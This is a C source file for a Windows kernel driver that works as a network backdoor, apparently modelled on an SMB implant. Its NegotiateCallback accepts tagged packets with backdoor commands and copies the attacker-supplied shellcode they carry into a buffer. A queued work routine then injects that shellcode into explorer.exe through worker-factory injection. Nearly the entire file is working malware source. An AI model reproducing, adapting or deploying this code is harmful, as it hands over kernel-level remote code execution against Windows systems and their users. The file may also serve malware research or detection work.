#include "common.h"
#include <ntddk.h>
#include "shellinject.h"
#include "scrape.h"
#include "intern_structs.h"

BOOLEAN bTrue = TRUE;
NTSTATUS ntStatus = STATUS_SUCCESS;

HANDLE hProcess = NULL;
PKEVENT pKevent = NULL;
SIZE_T shellcodeSize = 0;
PVOID addrAllocMem = NULL;

PWORK_QUEUE_ITEM item;

NTSTATUS DisconnectClient(){
	DbgPrint("[+] Triggered DisconnectClient\n");
	return 0x1;
}
NTSTATUS RegisterEndpoint(){
	DbgPrint("[+] Triggered RegisterEndpoint\n");
	return 0x1;
}
NTSTATUS DeregisterEndpoint(){
	DbgPrint("[+] Triggered DeregisterEndpoint\n");
	return 0x1;
}

NTSTATUS ReceiveCallback(){
	DbgPrint("[+] Triggered ReceiveCallback\n");
	return STATUS_SUCCESS;
}

NTSTATUS ConnectCallback(){
	DbgPrint("[+] Triggered ConnectCallback\n");
	return STATUS_SUCCESS;
}
typedef struct __WORK_QUEUE_ITEM
{
	LIST_ENTRY	List;
	PVOID		Routine;
	PVOID		Parameter;
} _WORK_QUEUE_ITEM, * _PWORK_QUEUE_ITEM;


UCHAR USER_MODE_PAYLOAD2[4096];

DWORD size;
void InjectionRoutine() {
	DbgPrint("HELLO FROM %d IRQL LEVEL!\n", KeGetCurrentIrql());

	NTSTATUS Status = STATUS_DRIVER_INTERNAL_ERROR;

	UNICODE_STRING ZwCreateIoCompletionName = RTL_CONSTANT_STRING(L"ZwCreateIoCompletion");
	UNICODE_STRING PsGetProcessImageFileNameName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");

	__ZwCreateIoCompletion = (ZW_CREATE_IO_COMPLETION)
		MmGetSystemRoutineAddress(&ZwCreateIoCompletionName);

	__PsGetProcessImageFileName = (PS_GET_PROCESS_IMAGE_FILE_NAME)
		MmGetSystemRoutineAddress(&PsGetProcessImageFileNameName);

	__ZwCreateWorkerFactory = (ZW_CREATE_WORKER_FACTORY)
		MakeHeresyZwStubFromNtdllExport((PUCHAR)&ZwReadFile, "NtCreateWorkerFactory", 'RePu');

	//__debugbreak();
	__ZwSetInformationWorkerFactory = (ZW_SET_INFORMATION_WORKER_FACTORY)
		MakeHeresyZwStubFromNtdllExport((PUCHAR)&ZwReadFile, "NtSetInformationWorkerFactory", 'RePu');

	if (__ZwCreateWorkerFactory != NULL &&
		__ZwSetInformationWorkerFactory != NULL &&
		__ZwCreateIoCompletion != NULL &&
		__PsGetProcessImageFileName != NULL)
	{

		Status = InjectWorkFactory(
			"explorer.exe",
			&USER_MODE_PAYLOAD2,
			size,
			'RePu');
	}

	if (__ZwSetInformationWorkerFactory)
	{
	//	__debugbreak();
		ExFreePoolWithTag((PVOID)__ZwSetInformationWorkerFactory, 'RePu');
	}

	if (__ZwCreateWorkerFactory)
	{
	//	__debugbreak();
		ExFreePoolWithTag((PVOID)__ZwCreateWorkerFactory, 'RePu');
	}
}

NTSTATUS NegotiateCallback(PVOID Unk0, ULONG InputBufferSize, PULONG InputBuffer){
	DbgPrint("[+] Triggered NegotiateCallback!\n");

	if (*(ULONG*)InputBuffer == REPULSARTAG) {

		PINTERNAL_EXECUTE packet = (PINTERNAL_EXECUTE)InputBuffer;

		DbgPrint("[+] Received packet with tag 0x%x\n", *(PULONG)packet->SmbHeader);
		DbgPrint("[+] Packet size 0x%x\n", InputBufferSize);
		DbgPrint("[+] Received command 0x%x\n", packet->BackdoorCommand);
		switch (packet->BackdoorCommand)
		{

		case 0x0C:
			DbgPrint("[+] Ping-pong...\n");

		case 0x2B:
			
			
			DbgPrint("[+] Shellcode size 0x%x\n", packet->ShellcodeLength);
			size = packet->ShellcodeLength;

			memcpy(USER_MODE_PAYLOAD2, packet->shellcode, packet->ShellcodeLength);
			item = ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
			DbgPrint("OH NO! IRQL: %d\n", KeGetCurrentIrql());
			DbgPrint("Trying to escape from DPC...\n");
			
			ExInitializeWorkItem(item, InjectionRoutine, item);
			ExQueueWorkItem(item, DelayedWorkQueue);
			
		default:
			break;
		}
	}
	else 
	{
		return STATUS_BAD_DATA;
	}
	return STATUS_SUCCESS;
}


